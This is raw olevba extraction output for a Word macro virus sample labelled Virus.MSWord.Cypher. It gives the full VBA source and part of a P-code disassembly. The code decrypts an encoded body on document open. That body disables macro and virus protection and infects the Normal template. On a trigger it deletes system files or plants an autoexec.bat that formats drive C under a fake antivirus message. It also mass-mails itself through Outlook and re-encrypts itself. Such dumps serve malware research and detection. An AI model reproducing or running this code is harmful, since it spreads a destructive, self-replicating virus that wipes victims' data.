olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Cypher
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDoc.cls 
in file: ./Virus.MSWord.Cypher - OLE stream: 'Macros/VBA/ThisDoc'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
    On Error Resume Next
    Dim M(2) As Variant: Dim L(8) As Byte
    Set M(1) = ActiveDocument.VBProject.VBComponents.Item(1)
    Set M(2) = NormalTemplate.VBProject.VBComponents.Item(1)
    Set CM = M(1).CodeModule
    LinBeg = 33
    Line1 = CM.Lines(LinBeg, 1)
    L(1) = 1: n = 1 + LinBeg: CC = CM.Lines(LinBeg, CM.CountOfLines - LinBeg)
    For I = 2 To 8
        L(I) = Mid(Line1, I, 1)
    Next
    Do While InStr(CM.Lines(n, 1), ": End" + " Sub") = False
        CypLinen = CM.Lines(n, 1)
        Linen = ""
        For k = 2 To Len(CypLinen)
            o = Asc(Mid(CypLinen, k, 1))
            j = Int(o / 32) + 1
            I = 1
            Do While (j <> L(I))
                I = I + 1
            Loop
            nc = o - 32 * (L(I) - I)
            Linen = Linen + Chr(nc)
        Next
        CM.ReplaceLine n, Linen: n = n + 1
    Loop
    CM.DeleteLines LinBeg
    BDMFS (M)
    CM.DeleteLines LinBeg, CM.CountOfLines - LinBeg: CM.InsertLines LinBeg, CC:    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub
Sub BDMFS(M As Variant)
'7832546
'ÀÀÀÀïNÀåRRORÀòESUMEÀîEXT
'ÀÀÀÀéFÀóYSTEMÎðRIVATEðROFILEóTRINGÈÂÂÌÀÂèëåùÿãõòòåîôÿõóåòüóOFTWAREüíICROSOFTüïFFICEüÙÎÐü÷ORDüóECURITYÂÌÀÂìEVELÂÉÀÜÞÀÂÂÀôHENÀóYSTEMÎðRIVATEðROFILEóTRINGÈÂÂÌÀÂèëåùÿãõòòåîôÿõóåòüóOFTWAREüíICROSOFTüïFFICEüÙÎÐü÷ORDüóECURITYÂÌÀÂìEVELÂÉÀÝÀÑ
'ÀÀÀÀãOMMANDâARSÈÂôOOLSÂÉÎãONTROLSÈÂíACROÂÉÎåNABLEDÀÝÀæALSEÚÀïPTIONSÎãONFIRMãONVERSIONSÀÝÀæALSEÚÀïPTIONSÎöIRUSðROTECTIONÀÝÀæALSEÚÀïPTIONSÎóAVEîORMALðROMPTÀÝÀæALSE
'ÀÀÀÀóETÀFSÀÝÀãREATEïBJECTÈÂóCRIPTINGÎæILEóYSTEMïBJECTÂÉ
'ÀÀÀÀóETÀæÀÝÀFSÎçETæILEÈîORMALôEMPLATEÎæULLîAMEÉÚÀæÎáTTRIBUTESÀÝÀÐ
'éFÀäATEÀÞÀÃ×ÏÑ×ÏÒÐÐÐÃÀôHENÀÇITÀSÀMYÀBIRTHDAYÀÁ
'ÀÀÀÀéFÀáPPLICATIONÎõSERîAMEÀÜÞÀÂ^^^áNGELÂÀôHEN
'ÀÀÀÀÀÀÀÀFSÎäELETEæILEÀÂãÚüIOÎSYSÂÌÀôRUEÚÀFSÎäELETEæILEÀÂãÚüCONFIGÎSYSÂÌÀôRUEÚÀFSÎäELETEæILEÀÂãÚüáUTOEXECÎBATÂÌÀôRUEÚÀFSÎäELETEæILEÀÂãÚü÷INDOWSüWINÎCOMÂÌÀôRUEÚ
'ÀÀÀÀÀÀÀÀéFÀéNóTRÈáPPLICATIONÎõSERîAMEÌÀÂKHÂÉÀÝÀôRUEÀôHEN
'ÀÀÀÀÀÀÀÀÀÀÀÀóETÀAUÀÝÀFSÎãREATEôEXTæILEÈÂãÚüAUTOEXECÎBATÂÌÀôRUEÉ
'ÀÀÀÀÀÀÀÀÀÀÀÀAUÎ÷RITEìINEÀÈÂàECHOÀOFFÂÉ
'ÀÀÀÀÀÀÀÀÀÀÀÀAUÎ÷RITEìINEÀÈÂàECHOÀùOURÀãOMPUTERÀISÀBEINGÀCHECKEDÀBYÀYOURÀáNTIöIRUSÀÍÀðLEASEÀ÷AITÀÍÂÉ
'ÀÀÀÀÀÀÀÀÀÀÀÀAUÎ÷RITEìINEÀÈÂàECHOÀ^^^áNGELÂÉ
'ÀÀÀÀÀÀÀÀÀÀÀÀAUÎ÷RITEìINEÀÈÂFORMATÀCÚÀÏAUTOTESTÀÏQÀÏUÂÉ
'ÀÀÀÀÀÀÀÀÀÀÀÀAUÎãLOSE
'ÀÀÀÀÀÀÀÀåNDÀéF
'ÀÀÀÀåNDÀéF
'ÀÀÀÀéFÀáCTIVEäOCUMENTÎöâðROJECTÎöâãOMPONENTSÎéTEMÈÑÉÎîAMEÀÝÀÂôHISäOCÂÀôHEN
'ÀÀÀÀÀÀÀÀóETÀïìÀÝÀãREATEïBJECTÈÂïUTLOOKÎáPPLICATIONÂÉ
'ÀÀÀÀÀÀÀÀóETÀíîÀÝÀïìÎçETîAMEóPACEÈÂíáðéÂÉÚÀíîÎìOGONÚÀóETÀïíÀÝÀïìÎãREATEéTEMÈOLíAILéTEMÉ
'ÀÀÀÀÀÀÀÀæORÀAÀÝÀÑÀôOÀíîÎáDDRESSìISTSÎãOUNT
'ÀÀÀÀÀÀÀÀÀÀÀÀòANDOMIZEÀôIMER
'ÀÀÀÀÀÀÀÀÀÀÀÀéFÀíîÎáDDRESSìISTSÈAÉÎáDDRESSåNTRIESÎãOUNTÀÞÀØÀôHEN
'ÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀæORÀRÀÝÀÑÀôOÀéNTÈíîÎáDDRESSìISTSÈAÉÎáDDRESSåNTRIESÎãOUNTÀÏÀØÉ
'ÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀôARGETÀÝÀéNTÈÑÀËÀíîÎáDDRESSìISTSÈAÉÎáDDRESSåNTRIESÎãOUNTÀÊÀòNDÉ
'ÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀïíÎòECIPIENTSÎáDDÀÈíîÎáDDRESSìISTSÈAÉÎáDDRESSåNTRIESÈôARGETÉÉ
'ÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀîEXT
'ÀÀÀÀÀÀÀÀÀÀÀÀåNDÀéF
'ÀÀÀÀÀÀÀÀîEXT
'ÀÀÀÀÀÀÀÀ÷ITHÀïí
'ÀÀÀÀÀÀÀÀÀÀÀÀóETÀòECÀÝÀÎòECIPIENTSÎáDDÈÂOUTLOOKÙ×ÿÒÐÐÐàHOTMAILÎCOMÞÂÉÚÀòECÎòESOLVE
'ÀÀÀÀÀÀÀÀÀÀÀÀÎóUBJECTÀÝÀáCTIVEäOCUMENTÎîAMEÚÀÎâODYÀÝÀáPPLICATIONÎõSERîAMEÀÆÀVBãRìFÀÆÀáPPLICATIONÎõSERáDDRESSÀÆÀVBãRìFÀÆÀVBãRìFÚÀÎáTTACHMENTSÎáDDÀáCTIVEäOCUMENTÎæULLîAMEÚÀÎóEND
'ÀÀÀÀÀÀÀÀåNDÀ÷ITH
'ÀÀÀÀÀÀÀÀíîÎìOGOFF
'ÀÀÀÀÀÀÀÀóETÀïìÀÝÀîOTHING
'ÀÀÀÀåNDÀéF
'åNDÀéF
'ÀÀÀÀîBìÑÀÝÀíÈÑÉÎãODEíODULEÎãOUNTïFìINES
'ÀÀÀÀîBìÒÀÝÀíÈÒÉÎãODEíODULEÎãOUNTïFìINES
'ÀÀÀÀéîæÿÀÝÀæALSEÚÀìINâEGÀÝÀÓÓ
'ÀÀÀÀéFÀíÈÒÉÎîAMEÀÜÞÀÂôHISäOCÂÀôHEN
'ÀÀÀÀÀÀÀÀéFÀîBìÒÀÞÀÐÀôHEN
'ÀÀÀÀÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎäELETEìINESÀÑÌÀîBìÒ
'ÀÀÀÀÀÀÀÀåNDÀéF
'ÀÀÀÀÀÀÀÀíÈÒÉÎîAMEÀÝÀÂôHISäOCÂÚÀéîæÀÝÀôRUE
'ÀÀÀÀåNDÀéF
'ÀÀÀÀéFÀéîæÀÝÀæALSEÀôHENÀçOôOÀãòùðôÿ
'ÀÀÀÀîEWîAMEÀÝÀÂÂ
'ÀÀÀÀòANDOMIZEÀôIMER
'ÀÀÀÀæORÀéÀÝÀÑÀôOÀÕ
'ÀÀÀÀÀÀÀÀîEWîAMEÀÝÀîEWîAMEÀËÀãHRÈéNTÈÖÕÀËÀÈÒÕÀÊÀòNDÉÉÉ
'ÀÀÀÀîEXT
'ÀÀÀÀéFÀéNóTRÈíÈÑÉÎãODEíODULEÎìINESÈÑÌÀÑÉÌÀÂïPENÂÉÀôHEN
'ÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎáDDæROMóTRINGÀÂðRIVATEÀóUBÀäOCUMENTÿãLOSEÈÉÂ
'ÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀÒÌÀÂÀÀÀÀïNÀåRRORÀòESUMEÀîEXTÂ
'ÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀÓÌÀÂÀÀÀÀäIMÀíÈÒÉÀáSÀöARIANTÚÀäIMÀìÈØÉÀáSÀâYTEÂ
'ÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀÔÌÀÂÀÀÀÀóETÀíÈÒÉÀÝÀáCTIVEäOCUMENTÎöâðROJECTÎöâãOMPONENTSÎéTEMÈÑÉÂ
'ÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀÕÌÀÂÀÀÀÀóETÀíÈÑÉÀÝÀîORMALôEMPLATEÎöâðROJECTÎöâãOMPONENTSÎéTEMÈÑÉÂ
'ÀÀÀÀÀÀÀÀìINEÀÝÀÖ
'ÀÀÀÀÀÀÀÀäOÀ÷HILEÀéNóTRÈíÈÑÉÎãODEíODULEÎìINESÈìINEÌÀÑÉÌÀÂäELETEÂÉÀÝÀæALSE
'ÀÀÀÀÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀìINEÌÀíÈÑÉÎãODEíODULEÎìINESÈìINEÌÀÑÉÚÀìINEÀÝÀìINEÀËÀÑ
'ÀÀÀÀÀÀÀÀìOOP
'ÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀìINEÌÀÂÀÀÀÀãíÎäELETEìINESÀìINâEGÂÚÀìINEÀÝÀìINEÀËÀÑ
'ÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀìINEÌÀÂÀÀÀÀÂÀËÀîEWîAMEÀËÀÂÈíÉÂÚÀìINEÀÝÀìINEÀËÀÑ
'ÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀìINEÌÀÂÀÀÀÀÂÀËÀÂãíÎäELETEìINESÀìINâEGÌÀãíÎãOUNTïFìINESÀÍÀìINâEGÚÀãíÎéNSERTìINESÀìINâEGÌÀããÚÀÀÀÀáCTIVEäOCUMENTÎóAVEáSÀæILEîAMEÚÝáCTIVEäOCUMENTÎæULLîAMEÂÚÀìINEÀÝÀìINEÀËÀÑ
'ÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀìINEÌÀÂåNDÀóUBÂÚÀìINEÀÝÀìINEÀËÀÑ
'ÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀìINEÌÀÂóUBÀÂÀËÀîEWîAMEÀËÀÂÈíÀáSÀöARIANTÉÂÚÀìINEÀÝÀìINEÀËÀÑ
'ÀÀÀÀÀÀÀÀäOÀ÷HILEÀíÈÑÉÎãODEíODULEÎìINESÈìINEÌÀÑÉÀÜÞÀÂÂ
'ÀÀÀÀÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀìINEÌÀíÈÑÉÎãODEíODULEÎìINESÈìINEÌÀÑÉÚÀìINEÀÝÀìINEÀËÀÑ
'ÀÀÀÀÀÀÀÀìOOP
'ÀÀÀÀåLSEéFÀéNóTRÈíÈÑÉÎãODEíODULEÎìINESÈÑÌÀÑÉÌÀÂãLOSEÂÉÀôHEN
'ÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎáDDæROMóTRINGÀÂðRIVATEÀóUBÀäOCUMENTÿïPENÈÉÂ
'ÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀÒÌÀÂÀÀÀÀïNÀåRRORÀòESUMEÀîEXTÂ
'ÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀÓÌÀÂÀÀÀÀäIMÀíÈÒÉÀáSÀöARIANTÚÀäIMÀìÈØÉÀáSÀâYTEÂ
'ÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀÔÌÀÂÀÀÀÀóETÀíÈÑÉÀÝÀáCTIVEäOCUMENTÎöâðROJECTÎöâãOMPONENTSÎéTEMÈÑÉÂ
'ÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀÕÌÀÂÀÀÀÀóETÀíÈÒÉÀÝÀîORMALôEMPLATEÎöâðROJECTÎöâãOMPONENTSÎéTEMÈÑÉÂ
'ÀÀÀÀÀÀÀÀìINEÀÝÀÖ
'ÀÀÀÀÀÀÀÀäOÀ÷HILEÀéNóTRÈíÈÑÉÎãODEíODULEÎìINESÈìINEÌÀÑÉÌÀÂäELETEÂÉÀÝÀæALSE
'ÀÀÀÀÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀìINEÌÀíÈÑÉÎãODEíODULEÎìINESÈìINEÌÀÑÉÚÀìINEÀÝÀìINEÀËÀÑ
'ÀÀÀÀÀÀÀÀìOOP
'ÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀìINEÌÀÂÀÀÀÀãíÎäELETEìINESÀìINâEGÂÚÀìINEÀÝÀìINEÀËÀÑ
'ÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀìINEÌÀÂÀÀÀÀÂÀËÀîEWîAMEÀËÀÂÈíÉÂÚÀìINEÀÝÀìINEÀËÀÑ
'ÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀìINEÌÀÂÀÀÀÀÂÀËÀÂãíÎäELETEìINESÀìINâEGÌÀãíÎãOUNTïFìINESÀÍÀìINâEGÚÀãíÎéNSERTìINESÀìINâEGÌÀããÚÀÀÀÀáCTIVEäOCUMENTÎóAVEáSÀæILEîAMEÚÝáCTIVEäOCUMENTÎæULLîAMEÂÚÀìINEÀÝÀìINEÀËÀÑ
'ÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀìINEÌÀÂåNDÀóUBÂÚÀìINEÀÝÀìINEÀËÀÑ
'ÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀìINEÌÀÂóUBÀÂÀËÀîEWîAMEÀËÀÂÈíÀáSÀöARIANTÉÂÚÀìINEÀÝÀìINEÀËÀÑ
'ÀÀÀÀÀÀÀÀäOÀ÷HILEÀíÈÑÉÎãODEíODULEÎìINESÈìINEÌÀÑÉÀÜÞÀÂÂ
'ÀÀÀÀÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀìINEÌÀíÈÑÉÎãODEíODULEÎìINESÈìINEÌÀÑÉÚÀìINEÀÝÀìINEÀËÀÑ
'ÀÀÀÀÀÀÀÀìOOP
'ÀÀÀÀåNDÀéF
'ãòùðôÿÚ
'ÀÀÀÀäIMÀìÈØÉÀáSÀâYTE
'ÀÀÀÀéFÀéîæÀÝÀæALSEÀôHENÀçOôOÀåîäÿ
'ÀÀÀÀòANDOMIZEÀôIMER
'ÀÀÀÀìÈÑÉÀÝÀÑ
'ÀÀÀÀæORÀéÀÝÀÒÀôOÀØ
'ÀÀÀÀÀÀÀÀæOUNDÀÝÀæALSE
'ÀÀÀÀÀÀÀÀéTERÀÝÀÐ
'ÀÀÀÀÀÀÀÀäOÀ÷HILEÀæOUNDÀÝÀæALSE
'ÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀéTERÀÝÀéTERÀËÀÑ
'ÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀNÀÝÀéNTÈÈØÀÊÀòNDÉÀËÀÑÉ
'ÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀéFÀNÀÜÞÀéÀïRÀéTERÀÞÀÑÕÀôHEN
'ÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀJÀÝÀÑ
'ÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀäOÀ÷HILEÀÈìÈJÉÀÜÞÀNÉÀáNDÀJÀÜÀé
'ÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀJÀÝÀJÀËÀÑ
'ÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀìOOP
'ÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀéFÀJÀÝÀéÀôHEN
'ÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀæOUNDÀÝÀôRUE
'ÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀìÈéÉÀÝÀN
'ÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀåNDÀéF
'ÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀåNDÀéF
'ÀÀÀÀÀÀÀÀìOOP
'ÀÀÀÀîEXT
'ÀÀÀÀJÀÝÀìINâEG
'ÀÀÀÀäIMÀãYPHERÀáSÀóTRINGÚÀãYPHERÀÝÀÂÂ
'ÀÀÀÀäOÀ÷HILEÀéNóTRÈíÈÒÉÎãODEíODULEÎìINESÈJÌÀÑÉÌÀÂÚÀåNDÀÂÀËÀÂóUBÂÉÀÝÀæALSE
'ÀÀÀÀÀÀÀÀìINEJÀÝÀíÈÒÉÎãODEíODULEÎìINESÈJÌÀÑÉ
'ÀÀÀÀÀÀÀÀãYPìINEJÀÝÀÂÇÂ
'ÀÀÀÀÀÀÀÀæORÀKÀÝÀÑÀôOÀìENÈìINEJÉ
'ÀÀÀÀÀÀÀÀÀÀÀÀOÀÝÀáSCÈíIDÈìINEJÌÀKÌÀÑÉÉ
'ÀÀÀÀÀÀÀÀÀÀÀÀéÀÝÀéNTÈOÀÏÀÓÒÉÀËÀÑ
'ÀÀÀÀÀÀÀÀÀÀÀÀãÀÝÀÓÒÀÊÀÈìÈéÉÀÍÀéÉÀËÀO
'ÀÀÀÀÀÀÀÀÀÀÀÀãYPìINEJÀÝÀãYPìINEJÀËÀãHRÈãÉ
'ÀÀÀÀÀÀÀÀîEXT
'ÀÀÀÀÀÀÀÀãYPHERÀÝÀãYPHERÀËÀãYPìINEJÀËÀãHRÈÑÓÉ
'ÀÀÀÀÀÀÀÀJÀÝÀJÀËÀÑ
'ÀÀÀÀìOOP
'ÀÀÀÀëEÀÝÀÂÂ
'ÀÀÀÀæORÀéÀÝÀÒÀôOÀØ
'ÀÀÀÀÀÀÀÀëEÀÝÀëEÀËÀæORMATÈìÈéÉÉ
'ÀÀÀÀîEXT
'ÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀìINâEGÌÀÂÇÂÀËÀëE
'ÀÀÀÀíÈÒÉÎãODEíODULEÎäELETEìINESÀìINâEGÀËÀÑÌÀíÈÒÉÎãODEíODULEÎãOUNTïFìINESÀÍÀìINâEG
'ÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀìINâEGÀËÀÑÌÀãYPHERÀËÀÂÚÀåNDÂÀËÀÂÀóUBÂ
'åîäÿÚ
: End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Cypher
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDoc - 15354 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0002 
' 	VarDefn M (As Variant)
' 	BoS 0x0000 
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0008 
' 	VarDefn L (As Byte)
' Line #3:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	LitDI2 0x0001 
' 	ArgsSet M 0x0001 
' Line #4:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	LitDI2 0x0002 
' 	ArgsSet M 0x0001 
' Line #5:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	ArgsLd M 0x0001 
' 	MemLd CodeModule 
' 	Set CM 
' Line #6:
' 	LitDI2 0x0021 
' 	St LinBeg 
' Line #7:
' 	Ld LinBeg 
' 	LitDI2 0x0001 
' 	Ld CM 
' 	ArgsMemLd Lines 0x0002 
' 	St Line1 
' Line #8:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsSt L 0x0001 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Ld LinBeg 
' 	Add 
' 	St n 
' 	BoS 0x0000 
' 	Ld LinBeg 
' 	Ld CM 
' 	MemLd CountOfLines 
' 	Ld LinBeg 
' 	Sub 
' 	Ld CM 
' 	ArgsMemLd Lines 0x0002 
' 	St CC 
' Line #9:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	LitDI2 0x0008 
' 	For 
' Line #10:
' 	Ld Line1 
' 	Ld I 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Ld I 
' 	ArgsSt L 0x0001 
' Line #11:
' 	StartForVariable 
' 	Next 
' Line #12:
' 	Ld n 
' 	LitDI2 0x0001 
' 	Ld CM 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0005 ": End"
' 	LitStr 0x0004 " Sub"
' 	Add 
' 	FnInStr 
' 	LitVarSpecial (False)
' 	Eq 
' 	DoWhile 
' Line #13:
' 	Ld n 
' 	LitDI2 0x0001 
' 	Ld CM 
' 	ArgsMemLd Lines 0x0002 
' 	St CypLinen 
' Line #14:
' 	LitStr 0x0000 ""
' 	St Linen 
' Line #15:
' 	StartForVariable 
' 	Ld k 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld CypLinen 
' 	FnLen 
' 	For 
' Line #16:
' 	Ld CypLinen 
' 	Ld k 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	St o 
' Line #17:
' 	Ld o 
' 	LitDI2 0x0020 
' 	Div 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St j 
' Line #18:
' 	LitDI2 0x0001 
' 	St I 
' Line #19:
' 	Ld j 
' 	Ld I 
' 	ArgsLd L 0x0001 
' 	Ne 
' 	Paren 
' 	DoWhile 
' Line #20:
' 	Ld I 
' 	LitDI2 0x0001 
' 	Add 
' 	St I 
' Line #21:
' 	Loop 
' Line #22:
' 	Ld o 
' 	LitDI2 0x0020 
' 	Ld I 
' 	ArgsLd L 0x0001 
' 	Ld I 
' 	Sub 
' 	Paren 
' 	Mul 
' 	Sub 
' 	St nc 
' Line #23:
' 	Ld Linen 
' 	Ld nc 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St Linen 
' Line #24:
' 	StartForVariable 
' 	Next 
' Line #25:
' 	Ld n 
' 	Ld Linen 
' 	Ld CM 
' 	ArgsMemCall ReplaceLine 0x0002 
' 	BoS 0x0000 
' 	Ld n 
' 	LitDI2 0x0001 
' 	Add 
' 	St n 
' Line #26:
' 	Loop 
' Line #27:
' 	Ld LinBeg 
' 	Ld CM 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #28:
' 	Ld M 
' 	Paren 
' 	ArgsCall BDMFS 0x0001 
' Line #29:
' 	Ld LinBeg 
' 	Ld CM 
' 	MemLd CountOfLines 
' 	Ld LinBeg 
' 	Sub 
' 	Ld CM 
' 	ArgsMemCall DeleteLines 0x0002 
' 	BoS 0x0000 
' 	Ld LinBeg 
' 	Ld CC 
' 	Ld CM 
' 	ArgsMemCall InsertLines 0x0002 
' 	BoS 0x0053 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #30:
' 	EndSub 
' Line #31:
' 	FuncDefn (Sub BDMFS(M As Variant))
' Line #32:
' 	QuoteRem 0x0000 0x0007 "7832546"
' Line #33:
' 	QuoteRem 0x0000 0x0018 "ÀÀÀÀïNÀåRRORÀòESUMEÀîEXT"
' Line #34:
' 	QuoteRem 0x0000 0x00E9 "ÀÀÀÀéFÀóYSTEMÎðRIVATEðROFILEóTRINGÈÂÂÌÀÂèëåùÿãõòòåîôÿõóåòüóOFTWAREüíICROSOFTüïFFICEüÙÎÐü÷ORDüóECURITYÂÌÀÂìEVELÂÉÀÜÞÀÂÂÀôHENÀóYSTEMÎðRIVATEðROFILEóTRINGÈÂÂÌÀÂèëåùÿãõòòåîôÿõóåòüóOFTWAREüíICROSOFTüïFFICEüÙÎÐü÷ORDüóECURITYÂÌÀÂìEVELÂÉÀÝÀÑ"
' Line #35:
' 	QuoteRem 0x0000 0x00A1 "ÀÀÀÀãOMMANDâARSÈÂôOOLSÂÉÎãONTROLSÈÂíACROÂÉÎåNABLEDÀÝÀæALSEÚÀïPTIONSÎãONFIRMãONVERSIONSÀÝÀæALSEÚÀïPTIONSÎöIRUSðROTECTIONÀÝÀæALSEÚÀïPTIONSÎóAVEîORMALðROMPTÀÝÀæALSE"
' Line #36:
' 	QuoteRem 0x0000 0x0037 "ÀÀÀÀóETÀFSÀÝÀãREATEïBJECTÈÂóCRIPTINGÎæILEóYSTEMïBJECTÂÉ"
' Line #37:
' 	QuoteRem 0x0000 0x0041 "ÀÀÀÀóETÀæÀÝÀFSÎçETæILEÈîORMALôEMPLATEÎæULLîAMEÉÚÀæÎáTTRIBUTESÀÝÀÐ"
' Line #38:
' 	QuoteRem 0x0000 0x002E "éFÀäATEÀÞÀÃ×ÏÑ×ÏÒÐÐÐÃÀôHENÀÇITÀSÀMYÀBIRTHDAYÀÁ"
' Line #39:
' 	QuoteRem 0x0000 0x002E "ÀÀÀÀéFÀáPPLICATIONÎõSERîAMEÀÜÞÀÂ^^^áNGELÂÀôHEN"
' Line #40:
' 	QuoteRem 0x0000 0x009E "ÀÀÀÀÀÀÀÀFSÎäELETEæILEÀÂãÚüIOÎSYSÂÌÀôRUEÚÀFSÎäELETEæILEÀÂãÚüCONFIGÎSYSÂÌÀôRUEÚÀFSÎäELETEæILEÀÂãÚüáUTOEXECÎBATÂÌÀôRUEÚÀFSÎäELETEæILEÀÂãÚü÷INDOWSüWINÎCOMÂÌÀôRUEÚ"
' Line #41:
' 	QuoteRem 0x0000 0x0038 "ÀÀÀÀÀÀÀÀéFÀéNóTRÈáPPLICATIONÎõSERîAMEÌÀÂKHÂÉÀÝÀôRUEÀôHEN"
' Line #42:
' 	QuoteRem 0x0000 0x003F "ÀÀÀÀÀÀÀÀÀÀÀÀóETÀAUÀÝÀFSÎãREATEôEXTæILEÈÂãÚüAUTOEXECÎBATÂÌÀôRUEÉ"
' Line #43:
' 	QuoteRem 0x0000 0x0026 "ÀÀÀÀÀÀÀÀÀÀÀÀAUÎ÷RITEìINEÀÈÂàECHOÀOFFÂÉ"
' Line #44:
' 	QuoteRem 0x0000 0x0063 "ÀÀÀÀÀÀÀÀÀÀÀÀAUÎ÷RITEìINEÀÈÂàECHOÀùOURÀãOMPUTERÀISÀBEINGÀCHECKEDÀBYÀYOURÀáNTIöIRUSÀÍÀðLEASEÀ÷AITÀÍÂÉ"
' Line #45:
' 	QuoteRem 0x0000 0x002B "ÀÀÀÀÀÀÀÀÀÀÀÀAUÎ÷RITEìINEÀÈÂàECHOÀ^^^áNGELÂÉ"
' Line #46:
' 	QuoteRem 0x0000 0x0036 "ÀÀÀÀÀÀÀÀÀÀÀÀAUÎ÷RITEìINEÀÈÂFORMATÀCÚÀÏAUTOTESTÀÏQÀÏUÂÉ"
' Line #47:
' 	QuoteRem 0x0000 0x0014 "ÀÀÀÀÀÀÀÀÀÀÀÀAUÎãLOSE"
' Line #48:
' 	QuoteRem 0x0000 0x000E "ÀÀÀÀÀÀÀÀåNDÀéF"
' Line #49:
' 	QuoteRem 0x0000 0x000A "ÀÀÀÀåNDÀéF"
' Line #50:
' 	QuoteRem 0x0000 0x004A "ÀÀÀÀéFÀáCTIVEäOCUMENTÎöâðROJECTÎöâãOMPONENTSÎéTEMÈÑÉÎîAMEÀÝÀÂôHISäOCÂÀôHEN"
' Line #51:
' 	QuoteRem 0x0000 0x0034 "ÀÀÀÀÀÀÀÀóETÀïìÀÝÀãREATEïBJECTÈÂïUTLOOKÎáPPLICATIONÂÉ"
' Line #52:
' 	QuoteRem 0x0000 0x0056 "ÀÀÀÀÀÀÀÀóETÀíîÀÝÀïìÎçETîAMEóPACEÈÂíáðéÂÉÚÀíîÎìOGONÚÀóETÀïíÀÝÀïìÎãREATEéTEMÈOLíAILéTEMÉ"
